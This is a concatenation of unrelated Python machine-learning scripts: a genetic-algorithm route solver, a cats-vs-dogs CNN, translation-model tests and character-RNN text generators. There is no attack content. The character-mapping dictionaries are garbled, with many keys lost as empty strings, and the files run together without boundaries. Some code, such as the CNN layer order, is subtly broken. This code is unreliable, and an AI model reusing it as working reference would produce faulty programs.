        x = random.randint(0, 200)
        y = random.randint(0, 200)

        if 40 < x < 160:
            if 0.5 <= random.random():
                y = random.randint(0, 40)
            else:
                y = random.randint(160, 200)
        elif 40 < y < 160:
            if 0.5 <= random.random():
                x = random.randint(0, 40)
            else:
                x = random.randint(160, 200)

        cities.append(City(x, y))
    return cities
    # return [ City(x=random.randint(0, 200), y=random.randint(0, 200)) for i in range(size) ]


def create_route(cities):
    return random.sample(cities, len(cities))


def initial_population(popsize, cities):
    return [ create_route(cities) for i in range(popsize) ]


def sort_routes(population):
    """This function calculates the fitness of each route in population
    And returns a population sorted by its fitness in descending order"""

    result = [ (i, Fitness(route).fitness()) for i, route in enumerate(population) ]
    return sorted(result, key=operator.itemgetter(1), reverse=True)


def selection(population, elite_size):
    sorted_pop = sort_routes(population)
    df = pd.DataFrame(np.array(sorted_pop), columns=["Index", "Fitness"])
    # calculates the cumulative sum
    # example:
    # [5, 6, 7] => [5, 11, 18]
    df['cum_sum']  = df['Fitness'].cumsum()
    # calculates the cumulative percentage
    # example:
    # [5, 6, 7] => [5/18, 11/18, 18/18]
    # [5, 6, 7] => [27.77%, 61.11%, 100%]
    df['cum_perc'] = 100 * df['cum_sum'] / df['Fitness'].sum()

    result = [ sorted_pop[i][0] for i in range(elite_size) ]

    for i in range(len(sorted_pop) - elite_size):
        pick = random.random() * 100
        for i in range(len(sorted_pop)):
            if pick <= df['cum_perc'][i]:
                result.append(sorted_pop[i][0])
                break
    return [ population[index] for index in result ]


def breed(parent1, parent2):
    child1, child2 = [], []

    gene_A = random.randint(0, len(parent1))
    gene_B = random.randint(0, len(parent2))

    start_gene = min(gene_A, gene_B)
    end_gene   = max(gene_A, gene_B)

    for i in range(start_gene, end_gene):
        child1.append(parent1[i])
    
    child2 = [ item for item in parent2 if item not in child1 ]
    return child1 + child2


def breed_population(selection, elite_size):
    pool = random.sample(selection, len(selection))

    # for i in range(elite_size):
    #     children.append(selection[i])
    children = [selection[i] for i in range(elite_size)]
    children.extend([breed(pool[i], pool[len(selection)-i-1]) for i in range(len(selection) - elite_size)])

    # for i in range(len(selection) - elite_size):
    #     child = breed(pool[i], pool[len(selection)-i-1])
    #     children.append(child)

    return children


def mutate(route, mutation_rate):
    route_length = len(route)
    for swapped in range(route_length):
        if(random.random() < mutation_rate):
            swap_with = random.randint(0, route_length-1)
            route[swapped], route[swap_with] = route[swap_with], route[swapped]
    return route


def mutate_population(population, mutation_rate):
    return [ mutate(route, mutation_rate) for route in population ]


def next_gen(current_gen, elite_size, mutation_rate):
    select = selection(population=current_gen, elite_size=elite_size)
    children = breed_population(selection=select, elite_size=elite_size)
    return mutate_population(children, mutation_rate)


def genetic_algorithm(cities, popsize, elite_size, mutation_rate, generations, plot=True, prn=True):
    global route
    global progress

    population = initial_population(popsize=popsize, cities=cities)
    if plot:
        animate_progress()
    sorted_pop = sort_routes(population)
    initial_route = population[sorted_pop[0][0]]
    distance = 1 / sorted_pop[0][1]
    if prn:
        print(f"Initial distance: {distance}")
    try:
        if plot:
            progress = [ distance ]
            for i in range(generations):
                population = next_gen(population, elite_size, mutation_rate)
                sorted_pop = sort_routes(population)
                distance = 1 / sorted_pop[0][1]
                
                progress.append(distance)
                if prn:
                    print(f"[Generation:{i}] Current distance: {distance}")
                route = population[sorted_pop[0][0]]
        else:
            for i in range(generations):
                population = next_gen(population, elite_size, mutation_rate)
                distance = 1 / sort_routes(population)[0][1]
                
                if prn:
                    print(f"[Generation:{i}] Current distance: {distance}")
    except KeyboardInterrupt:
        pass
    stop_animation.set()
    final_route_index = sort_routes(population)[0][0]
    final_route = population[final_route_index]
    if prn:
        print("Final route:", final_route)
    
    return initial_route, final_route, distance


if __name__ == "__main__":
    cities = generate_cities(25)
    initial_route, final_route, distance = genetic_algorithm(cities=cities, popsize=120, elite_size=19, mutation_rate=0.0019, generations=1800)
    # plot_routes(initial_route, final_route)




import numpy
import matplotlib.pyplot as plt
import cv2
from PIL import Image
from multiprocessing import Process


def fig2img ( fig ):
    """
    brief Convert a Matplotlib figure to a PIL Image in RGBA format and return it
    param fig a matplotlib figure
    return a Python Imaging Library ( PIL ) image
    """
    # put the figure pixmap into a numpy array
    buf = fig2data ( fig )
    w, h, d = buf.shape
    return Image.frombytes( "RGB", ( w ,h ), buf.tostring( ) )


def fig2data ( fig ):
    """
    brief Convert a Matplotlib figure to a 4D numpy array with RGBA channels and return it
    param fig a matplotlib figure
    return a numpy 3D array of RGBA values
    """
    # draw the renderer
    fig.canvas.draw ( )
 
    # Get the RGBA buffer from the figure
    w,h = fig.canvas.get_width_height()
    buf = numpy.fromstring ( fig.canvas.tostring_rgb(), dtype=numpy.uint8 )
    buf.shape = ( w, h,3 )
 
    # canvas.tostring_argb give pixmap in ARGB mode. Roll the ALPHA channel to have it in RGBA mode
    buf = numpy.roll ( buf, 3, axis = 2 )
    return buf


if __name__ == "__main__":
    pass
    # figure = plt.figure()
    # plt.plot([3, 5, 9], [3, 19, 23])
    # img = fig2img(figure)
    # img.show()
    # while True:
    #     frame = numpy.array(img)
    #     # Convert RGB to BGR 
    #     frame = frame[:, :, ::-1].copy() 
    #     print(frame)
    #     cv2.imshow("test", frame)
    #     if cv2.waitKey(0) == ord('q'):
    #         break
    # cv2.destroyAllWindows()



def realtime_plot(route):

    
    figure = plt.figure(figsize=(14, 8))
    plt.title("Real time routes")
    for city in route:
        plt.scatter(city.x, city.y, s=70, c='b')

    plt.plot([ city.x for city in route ], [city.y for city in route], c='r')
    
    img = numpy.array(fig2img(figure))
    cv2.imshow("test", img)
    if cv2.waitKey(1) == ord('q'):
        cv2.destroyAllWindows()
    plt.close(figure)




from genetic import genetic_algorithm, generate_cities, City
import operator

def load_cities():
    return [ City(city[0], city[1]) for city in [(169, 20), (103, 24), (41, 9), (177, 76), (138, 173), (163, 108), (93, 34), (200, 84), (19, 184), (117, 176), (153, 30), (140, 29), (38, 108), (89, 183), (18, 4), (174, 38), (109, 169), (93, 23), (156, 10), (171, 27), (164, 91), (109, 194), (90, 169), (115, 37), (177, 93), (169, 20)] ]

def train():
    cities = load_cities()
    generations = 1000
    popsizes = [60, 100, 140, 180]
    elitesizes = [5, 15, 25, 35, 45]
    mutation_rates = [0.0001, 0.0005, 0.001, 0.005, 0.01]

    total_iterations = len(popsizes) * len(elitesizes) * len(mutation_rates)
    iteration = 0

    tries = {}

    for popsize in popsizes:
        for elite_size in elitesizes:
            for mutation_rate in mutation_rates:
                iteration += 1
                init_route, final_route, distance = genetic_algorithm( cities=cities,
                                         popsize=popsize,
                                         elite_size=elite_size,
                                         mutation_rate=mutation_rate,
                                         generations=generations,
                                         plot=False,
                                         prn=False)
                progress = iteration / total_iterations
                percentage = progress * 100
                print(f"[{percentage:5.2f}%] [Iteration:{iteration:3}/{total_iterations:3}] [popsize={popsize:3} elite_size={elite_size:2} mutation_rate={mutation_rate:7}] Distance: {distance:4}")
                tries[(popsize, elite_size, mutation_rate)] = distance
    
    min_gen = min(tries.values())
    reversed_tries = { v:k for k, v in tries.items() }
    best_combination = reversed_tries[min_gen]
    print("Best combination:", best_combination)


if __name__ == "__main__":
    train()

    
# best parameters
# popsize	elitesize	mutation_rateqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
# 90	    25		    0.0001
# 110	    10		    0.001
# 130	    10		    0.005
# 130	    20		    0.001
# 150	    25		    0.001




import os


def load_data(path):
    """
    Load dataset
    """
    input_file = os.path.join(path)
    with open(input_file, "r") as f:
        data = f.read()

    return data.split('\n')




import numpy as np
from keras.losses import sparse_categorical_crossentropy
from keras.models import Sequential
from keras.preprocessing.text import Tokenizer
from keras.utils import to_categorical


def _test_model(model, input_shape, output_sequence_length, french_vocab_size):
    if isinstance(model, Sequential):
        model = model.model

    assert model.input_shape == (None, *input_shape[1:]),\
        'Wrong input shape. Found input shape {} using parameter input_shape={}'.format(model.input_shape, input_shape)

    assert model.output_shape == (None, output_sequence_length, french_vocab_size),\
        'Wrong output shape. Found output shape {} using parameters output_sequence_length={} and french_vocab_size={}'\
            .format(model.output_shape, output_sequence_length, french_vocab_size)

    assert len(model.loss_functions) > 0,\
        'No loss function set.  Apply the compile function to the model.'

    assert sparse_categorical_crossentropy in model.loss_functions,\
        'Not using sparse_categorical_crossentropy function for loss.'


def test_tokenize(tokenize):
    sentences = [
        'The quick brown fox jumps over the lazy dog .',
        'By Jove , my quick study of lexicography won a prize .',
        'This is a short sentence .']
    tokenized_sentences, tokenizer = tokenize(sentences)
    assert tokenized_sentences == tokenizer.texts_to_sequences(sentences),\
        'Tokenizer returned and doesn\'t generate the same sentences as the tokenized sentences returned. '


def test_pad(pad):
    tokens = [
        [i for i in range(4)],
        [i for i in range(6)],
        [i for i in range(3)]]
    padded_tokens = pad(tokens)
    padding_id = padded_tokens[0][-1]
    true_padded_tokens = np.array([
        [i for i in range(4)] + [padding_id]*2,
        [i for i in range(6)],
        [i for i in range(3)] + [padding_id]*3])
    assert isinstance(padded_tokens, np.ndarray),\
        'Pad returned the wrong type.  Found {} type, expected numpy array type.'
    assert np.all(padded_tokens == true_padded_tokens), 'Pad returned the wrong results.'

    padded_tokens_using_length = pad(tokens, 9)
    assert np.all(padded_tokens_using_length == np.concatenate((true_padded_tokens, np.full((3, 3), padding_id)), axis=1)),\
        'Using length argument return incorrect results'


def test_simple_model(simple_model):
    input_shape = (137861, 21, 1)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = simple_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)


def test_embed_model(embed_model):
    input_shape = (137861, 21)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = embed_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)


def test_encdec_model(encdec_model):
    input_shape = (137861, 15, 1)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = encdec_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)


def test_bd_model(bd_model):
    input_shape = (137861, 21, 1)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = bd_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)


def test_model_final(model_final):
    input_shape = (137861, 15)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = model_final(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)




CATEGORIES = ["Dog", "Cat"]
IMG_SIZE = 100


DATADIR = r"C:\Users\STRIX\Desktop\CatnDog\PetImages"
TRAINING_DIR = r"E:\datasets\CatnDog\Training"
TESTING_DIR  = r"E:\datasets\CatnDog\Testing"




import cv2
import tensorflow as tf
import os
import numpy as np
import random
from settings import *
from tqdm import tqdm


# CAT_PATH = r"C:\Users\STRIX\Desktop\CatnDog\Testing\Cat"
# DOG_PATH = r"C:\Users\STRIX\Desktop\CatnDog\Testing\Dog"

MODEL = "Cats-vs-dogs-new-6-0.90-CNN"

def prepare_image(path):
    image = cv2.imread(path, cv2.IMREAD_GRAYSCALE)
    image = cv2.resize(image, (IMG_SIZE, IMG_SIZE))
    return image
    # img = cv2.imread(path, cv2.IMREAD_GRAYSCALE)
    # img = cv2.resize(img, (IMG_SIZE, IMG_SIZE))
    # return img.reshape(-1, IMG_SIZE, IMG_SIZE, 1)


def load_model():
    return tf.keras.models.load_model(f"{MODEL}.model")


def predict(img):
    prediction = model.predict([prepare_image(img)])[0][0]
    return int(prediction)


if __name__ == "__main__":
    model = load_model()
    x_test, y_test = [], []

    for code, category in enumerate(CATEGORIES):    
        path = os.path.join(TESTING_DIR, category)
        for img in tqdm(os.listdir(path), "Loading images:"):
            # result = predict(os.path.join(path, img))
            # if result == code:
            #     correct += 1
            # total += 1
            # testing_data.append((os.path.join(path, img), code))
            x_test.append(prepare_image(os.path.join(path, img)))
            y_test.append(code)

    x_test = np.array(x_test).reshape(-1, IMG_SIZE, IMG_SIZE, 1)

    # random.shuffle(testing_data)

    # total = 0
    # correct = 0

    # for img, code in testing_data:
        
    #     result = predict(img)
    #     if result == code:
    #         correct += 1
    #     total += 1

    # accuracy = (correct/total) * 100
    # print(f"{correct}/{total}   Total Accuracy: {accuracy:.2f}%")
    # print(x_test)
    # print("="*50)
    # print(y_test)
    print(model.evaluate([x_test], y_test))
    print(model.metrics_names)




import numpy as np
import matplotlib.pyplot as plt
import cv2
import os
# import cv2
from tqdm import tqdm
import random
from settings import *


# for the first time only
# for category in CATEGORIES: 
#     directory = os.path.join(TRAINING_DIR, category)
#     os.makedirs(directory)

# # for the first time only
# for category in CATEGORIES: 
#     directory = os.path.join(TESTING_DIR, category)
#     os.makedirs(directory)




# Total images for each category: 12501 image (total 25002)


# def create_data():
#     for code, category in enumerate(CATEGORIES):
#         path = os.path.join(DATADIR, category)
#         for counter, img in enumerate(tqdm(os.listdir(path)), start=1):
#             try:
#                 # absolute path of image
#                 image = os.path.join(path, img)
#                 image = cv2.imread(image, cv2.IMREAD_GRAYSCALE)
#                 image = cv2.resize(image, (IMG_SIZE, IMG_SIZE))
#                 if counter < 300:
#                     # testing image
#                     img = os.path.join(TESTING_DIR, category, img)
#                 else:
#                     # training image
#                     img = os.path.join(TRAINING_DIR, category, img)

#                 cv2.imwrite(img, image)
#             except:
#                 pass


def load_data(path):

    data = []

    for code, category in enumerate(CATEGORIES):
        p = os.path.join(path, category)
        for img in tqdm(os.listdir(p), desc=f"Loading {category} data: "):
            img = os.path.join(p, img)
            img = cv2.imread(img, cv2.IMREAD_GRAYSCALE)
            data.append((img, code))

    return data


def load_training_data():
    return load_data(TRAINING_DIR)


def load_testing_data():
    return load_data(TESTING_DIR)



# # load data
# training_data = load_training_data()
# # # shuffle data
# random.shuffle(training_data)

# X, y = [], []


# for features, label in tqdm(training_data, desc="Splitting the data: "):
#     X.append(features)
#     y.append(label)

# X = np.array(X).reshape(-1, IMG_SIZE, IMG_SIZE, 1)

# # pickling (images,labels)
# print("Pickling data...")
import pickle

# with open("X.pickle", 'wb') as pickle_out:
#     pickle.dump(X, pickle_out)

# with open("y.pickle", 'wb') as pickle_out:
#     pickle.dump(y, pickle_out)



def load():
    return np.array(pickle.load(open("X.pickle", 'rb'))), pickle.load(open("y.pickle", 'rb'))

print("Loading data...")
X, y = load()

X = X/255 # to make colors from 0 to 1
print("Shape of X:", X.shape)
import tensorflow
from tensorflow.keras.datasets import cifar10
from tensorflow.keras.preprocessing.image import ImageDataGenerator
from tensorflow.keras.callbacks import ModelCheckpoint
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Dropout, Activation, Flatten
from tensorflow.keras.layers import Conv2D, MaxPooling2D
# from tensorflow.keras.callbacks import TensorBoard

print("Imported tensorflow, building model...")

NAME = "Cats-vs-dogs-new-9-{val_acc:.2f}-CNN"

checkpoint = ModelCheckpoint(filepath=f"{NAME}.model", save_best_only=True, verbose=1)

# 3 conv, 64 nodes per layer, 0 dense

model = Sequential()

model.add(Conv2D(32, (2, 2), input_shape=X.shape[1:]))
model.add(Activation('relu'))
model.add(Conv2D(32, (2, 2)))
model.add(Dropout(0.1))
model.add(MaxPooling2D(pool_size=(2, 2)))

model.add(Conv2D(64, (2, 2)))
model.add(Activation('relu'))
model.add(Conv2D(64, (2, 2)))
model.add(Dropout(0.1))
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))

model.add(Conv2D(96, (2, 2)))
model.add(Activation('relu'))
model.add(Conv2D(96, (2, 2)))
model.add(Dropout(0.1))
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))

model.add(Conv2D(128, (2, 2)))
model.add(Activation('relu'))
model.add(Conv2D(128, (2, 2)))
model.add(Dropout(0.1))
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))

model.add(Dense(500, activation="relu"))

model.add(Flatten())  # this converts our 3D feature maps to 1D feature vectors

model.add(Dense(1))
model.add(Activation('sigmoid'))

model.summary()

print("Compiling model ...")

# tensorboard = TensorBoard(log_dir=f"logs/{NAME}")

model.compile(loss="binary_crossentropy",
              optimizer="rmsprop",
              metrics=['accuracy'])

print("Training...")

model.fit(X, y, batch_size=64, epochs=30, validation_split=0.2, callbacks=[checkpoint])




### Hyper Parameters ###

batch_size = 256         # Sequences per batch
num_steps = 70          # Number of sequence steps per batch
lstm_size = 256          # Size of hidden layers in LSTMs
num_layers = 2           # Number of LSTM layers
learning_rate = 0.003    # Learning rate
keep_prob = 0.3          # Dropout keep probability

epochs = 20
# Print losses every N interations
print_every_n = 100

# Save every N iterations
save_every_n = 500

NUM_THREADS = 12




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=1,
                        inter_op_parallelism_threads=1, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
                       
import train_chars
import numpy as np
import keyboard


char2int_target = {'\t': 0, '\n': 1, '\x0c': 2, ' ': 3, '!': 4, '"': 5, '#': 6, '': 7, '%': 8, '&': 9, "'": 10, '(': 11, ')': 12, '*': 13, '+': 14, ',': 15, '-': 16, '.': 17,
'/': 18, '0': 19, '1': 20, '2': 21, '3': 22, '4': 23, '5': 24, '6': 25, '7': 26, '8': 27, '9': 28, ':': 29, '': 30, '<': 31, '=': 32, '>': 33, '?': 34, '':
35, 'A': 36, 'B': 37, 'C': 38, 'D': 39, 'E': 40, 'F': 41, 'G': 42, 'H': 43, 'I': 44, 'J': 45, 'K': 46, 'L': 47, 'M': 48, 'N': 49, 'O': 50, 'P': 51, 'Q': 52, 'R': 53, 'S': 54, 'T': 55, 'U': 56, 'V': 57, 'W': 58, 'X': 59, 'Y': 60, 'Z': 61, '[': 62, '\\': 63, ']': 64, '^': 65, '_': 66, '': 67, 'a': 68, 'b': 69, 'c':
70, 'd': 71, 'e': 72, 'f': 73, 'g': 74, 'h': 75, 'i': 76, 'j': 77, 'k': 78, 'l': 79, 'm': 80, 'n': 81, 'o': 82, 'p': 83, 'q': 84, 'r': 85, 's': 86, 't': 87, 'u': 88, 'v': 89, 'w': 90, 'x': 91, 'y': 92, 'z': 93, '{': 94, '|': 95, '}': 96, '': 97, '': 98, '': 99, '': 100, '': 101, '': 102, '': 103, '': 104, '': 105, '\xad': 106, '': 107, '': 108, '': 109, '': 110, '': 111, '': 112, '': 113, '': 114, '': 115, '': 116, '': 117, '': 118, '': 119, '': 120, '': 121, '': 122, '': 123, '': 124, '': 125, '': 126, '': 127, '': 128, '': 129, '': 130, '': 131, '': 132, '': 133, '': 134, '': 135, '': 136, '': 137, '': 138, '': 139, '': 140, '': 141, '': 142, '': 143, '': 144, '': 145, '': 146, '': 147, '': 148, '': 149, '': 150, '': 151, '': 152, '': 153, '': 154, '': 155, '': 156, '': 157, '': 158, '': 159, '': 160, '': 161, '': 162, '': 163, '': 164, '': 165, '': 166, '': 167,
'': 168, '': 169, '': 170, '': 171, '': 172, '': 173, '': 174, '': 175, '': 176, '': 177, '': 178, '': 179, '': 180, '': 181, '': 182, '': 183, '': 184, '': 185, '': 186, '': 187, '': 188, '': 189, '': 190, '': 191, '': 192}


model = train_chars.CharRNN(len(char2int_target), lstm_size=train_chars.lstm_size, sampling=True)
saver = train_chars.tf.train.Saver()

def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c


def write_sample(checkpoint, lstm_size, vocab_size, char2int, int2char, prime="import"):
    # samples = [c for c in prime]
    
    with train_chars.tf.Session() as sess:
        saver.restore(sess, checkpoint)
        new_state = sess.run(model.initial_state)
        for c in prime:
            x = np.zeros((1, 1))
            x[0,0] = char2int[c]
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)
        # print("Preds:", preds)
        c = pick_top_n(preds, vocab_size)
        char = int2char[c]
        keyboard.write(char)
        time.sleep(0.01)
        # samples.append(char)
        while True:
            x[0,0] = c
            feed = {model.inputs: x,
                    model.keep_prob: 1.,  
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

            c = pick_top_n(preds, vocab_size)
            char = int2char[c]
            keyboard.write(char)
            time.sleep(0.01)
            # samples.append(char)
        
    # return ''.join(samples)ss", "as"

if __name__ == "__main__":
    # checkpoint = train_chars.tf.train_chars.latest_checkpoint("checkpoints")
    # print(checkpoint)
    checkpoint = "checkpoints/i6291_l256.ckpt"
    print()
    f = open("generates/python.txt", "a", encoding="utf8")
    int2char_target = { v:k for k, v in char2int_target.items() }
    import time
    time.sleep(2)
    write_sample(checkpoint, train_chars.lstm_size, len(char2int_target), char2int_target, int2char_target, prime="#"*100)




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
                       
import train_chars
import numpy as np


char2int_target = {'\t': 0, '\n': 1, '\x0c': 2, ' ': 3, '!': 4, '"': 5, '#': 6, '': 7, '%': 8, '&': 9, "'": 10, '(': 11, ')': 12, '*': 13, '+': 14, ',': 15, '-': 16, '.': 17,
'/': 18, '0': 19, '1': 20, '2': 21, '3': 22, '4': 23, '5': 24, '6': 25, '7': 26, '8': 27, '9': 28, ':': 29, '': 30, '<': 31, '=': 32, '>': 33, '?': 34, '':
35, 'A': 36, 'B': 37, 'C': 38, 'D': 39, 'E': 40, 'F': 41, 'G': 42, 'H': 43, 'I': 44, 'J': 45, 'K': 46, 'L': 47, 'M': 48, 'N': 49, 'O': 50, 'P': 51, 'Q': 52, 'R': 53, 'S': 54, 'T': 55, 'U': 56, 'V': 57, 'W': 58, 'X': 59, 'Y': 60, 'Z': 61, '[': 62, '\\': 63, ']': 64, '^': 65, '_': 66, '': 67, 'a': 68, 'b': 69, 'c':
70, 'd': 71, 'e': 72, 'f': 73, 'g': 74, 'h': 75, 'i': 76, 'j': 77, 'k': 78, 'l': 79, 'm': 80, 'n': 81, 'o': 82, 'p': 83, 'q': 84, 'r': 85, 's': 86, 't': 87, 'u': 88, 'v': 89, 'w': 90, 'x': 91, 'y': 92, 'z': 93, '{': 94, '|': 95, '}': 96, '': 97, '': 98, '': 99, '': 100, '': 101, '': 102, '': 103, '': 104, '': 105, '\xad': 106, '': 107, '': 108, '': 109, '': 110, '': 111, '': 112, '': 113, '': 114, '': 115, '': 116, '': 117, '': 118, '': 119, '': 120, '': 121, '': 122, '': 123, '': 124, '': 125, '': 126, '': 127, '': 128, '': 129, '': 130, '': 131, '': 132, '': 133, '': 134, '': 135, '': 136, '': 137, '': 138, '': 139, '': 140, '': 141, '': 142, '': 143, '': 144, '': 145, '': 146, '': 147, '': 148, '': 149, '': 150, '': 151, '': 152, '': 153, '': 154, '': 155, '': 156, '': 157, '': 158, '': 159, '': 160, '': 161, '': 162, '': 163, '': 164, '': 165, '': 166, '': 167,
'': 168, '': 169, '': 170, '': 171, '': 172, '': 173, '': 174, '': 175, '': 176, '': 177, '': 178, '': 179, '': 180, '': 181, '': 182, '': 183, '': 184, '': 185, '': 186, '': 187, '': 188, '': 189, '': 190, '': 191, '': 192}


model = train_chars.CharRNN(len(char2int_target), lstm_size=train_chars.lstm_size, sampling=True)
saver = train_chars.tf.train.Saver()

def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c


def sample(checkpoint, n_samples, lstm_size, vocab_size, char2int, int2char, prime="The"):
    samples = [c for c in prime]
    
    with train_chars.tf.Session() as sess:
        saver.restore(sess, checkpoint)
        new_state = sess.run(model.initial_state)
        for c in prime:
            x = np.zeros((1, 1))
            x[0,0] = char2int[c]
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)
        # print("Preds:", preds)
        c = pick_top_n(preds, vocab_size)
        samples.append(int2char[c])

        for i in range(n_samples):
            x[0,0] = c
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

            c = pick_top_n(preds, vocab_size)
            char = int2char[c]
            samples.append(char)
        #     if i == n_samples - 1 and char != " " and char != ".":
            # if i == n_samples - 1 and char != " ":
            #     # while char != "." and char != " ":
            #     while char != " ":
            #         x[0,0] = c
            #         feed = {model.inputs: x,
            #                 model.keep_prob: 1.,
            #                 model.initial_state: new_state}
            #         preds, new_state = sess.run([model.prediction, model.final_state], 
            #                                     feed_dict=feed)

            #         c = pick_top_n(preds, vocab_size)
            #         char = int2char[c]
            #         samples.append(char)

        
    return ''.join(samples)


if __name__ == "__main__":
    # checkpoint = train_chars.tf.train_chars.latest_checkpoint("checkpoints")
    # print(checkpoint)
    checkpoint = "checkpoints/i6291_l256.ckpt"
    print()
    f = open("generates/python.txt", "a", encoding="utf8")
    int2char_target = { v:k for k, v in char2int_target.items() }
    for prime in ["#"*100]:
        samp = sample(checkpoint, 5000, train_chars.lstm_size, len(char2int_target), char2int_target, int2char_target, prime=prime)
        print(samp, file=f)
        print(samp)
        print("="*50)
        print("="*50, file=f)




import numpy as np
import train_words


def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c


def sample(checkpoint, n_samples, lstm_size, vocab_size, prime=["The"]):
    samples = [c for c in prime]
    model = train_words.CharRNN(len(train_words.vocab), lstm_size=lstm_size, sampling=True)
    saver = train_words.tf.train.Saver()
    with train_words.tf.Session() as sess:
        saver.restore(sess, checkpoint)
        new_state = sess.run(model.initial_state)
        for c in prime:
            x = np.zeros((1, 1))
            x[0,0] = train_words.vocab_to_int[c]
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

        c = pick_top_n(preds, len(train_words.vocab))
        samples.append(train_words.int_to_vocab[c])

        for i in range(n_samples):
            x[0,0] = c
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

            c = pick_top_n(preds, len(train_words.vocab))
            char = train_words.int_to_vocab[c]
            samples.append(char)
        
    return ' '.join(samples)


if __name__ == "__main__":
    # checkpoint = train_words.tf.train_words.latest_checkpoint("checkpoints")
    # print(checkpoint)
    checkpoint = f"{train_words.CHECKPOINT}/i8000_l128.ckpt"
    samp = sample(checkpoint, 400, train_words.lstm_size, len(train_words.vocab), prime=["the", "very"])
    print(samp)




import tensorflow as tf
import numpy as np



def get_batches(arr, batch_size, n_steps):
    '''Create a generator that returns batches of size
       batch_size x n_steps from arr.
       
       Arguments
       ---------
       arr: Array you want to make batches from
       batch_size: Batch size, the number of sequences per batch
       n_steps: Number of sequence steps per batch
    '''
    chars_per_batch = batch_size * n_steps
    n_batches = len(arr) // chars_per_batch

    arr = arr[:chars_per_batch * n_batches]

    arr = arr.reshape((batch_size, -1))

    for n in range(0, arr.shape[1], n_steps):
        x = arr[:, n: n+n_steps]
        y_temp = arr[:, n+1:n+n_steps+1]
        y = np.zeros(x.shape, dtype=y_temp.dtype)
        y[:, :y_temp.shape[1]] = y_temp
        yield x, y


# batches = get_batches(encoded, 10, 50)
# x, y = next(batches)


def build_inputs(batch_size, num_steps):
    ''' Define placeholders for inputs, targets, and dropout 
    
        Arguments
        ---------
        batch_size: Batch size, number of sequences per batch
        num_steps: Number of sequence steps in a batch
        
    '''
    # Declare placeholders we'll feed into the graph
    inputs = tf.placeholder(tf.int32, shape=(batch_size, num_steps), name="inputs")
    targets = tf.placeholder(tf.int32, shape=(batch_size, num_steps), name="targets")
    
    # Keep probability placeholder for drop out layers
    keep_prob = tf.placeholder(tf.float32, name="keep_prob")
    
    return inputs, targets, keep_prob


def build_lstm(lstm_size, num_layers, batch_size, keep_prob):
    ''' Build LSTM cell.
    
        Arguments
        ---------
        lstm_size: Size of the hidden layers in the LSTM cells
        num_layers: Number of LSTM layers
        batch_size: Batch size
        keep_prob: Scalar tensor (tf.placeholder) for the dropout keep probability

    '''
    ### Build the LSTM Cell
    def build_cell():    
        # Use a basic LSTM cell
        lstm = tf.contrib.rnn.BasicLSTMCell(lstm_size)
        # Add dropout to the cell outputs
        drop_lstm = tf.contrib.rnn.DropoutWrapper(lstm, output_keep_prob=keep_prob)
        return drop_lstm
    
    
    # Stack up multiple LSTM layers, for deep learning
    # build num_layers layers of lstm_size LSTM Cells
    cell = tf.contrib.rnn.MultiRNNCell([build_cell() for _ in range(num_layers)])
    initial_state = cell.zero_state(batch_size, tf.float32)
    
    return cell, initial_state


def build_output(lstm_output, in_size, out_size):
    ''' Build a softmax layer, return the softmax output and logits.
    
        Arguments
        ---------
        
